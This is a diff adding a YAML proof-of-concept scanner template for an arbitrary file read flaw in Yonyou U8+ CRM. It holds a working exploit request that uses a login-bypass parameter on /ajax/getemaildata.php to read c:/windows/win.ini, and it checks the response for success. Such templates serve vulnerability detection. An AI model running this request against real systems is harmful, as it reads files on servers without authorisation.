@@ -1,0 +1,14 @@
+id: poc-yaml-yy-u8plus-crm-file-read
+info:
+  name: 用友U8+CRM 任意文件读取漏洞
+  severity: high
+  tags:
+  - 文件读取
+  finger: 用友U8+CRM
+requests:
+- method: GET
+  path: /ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini
+  expression: status_code == 200 && contains(body,"[files]") && contains(body,"[fonts]")
+    && content_type == "text/html"
+variables: {}
+transport: http
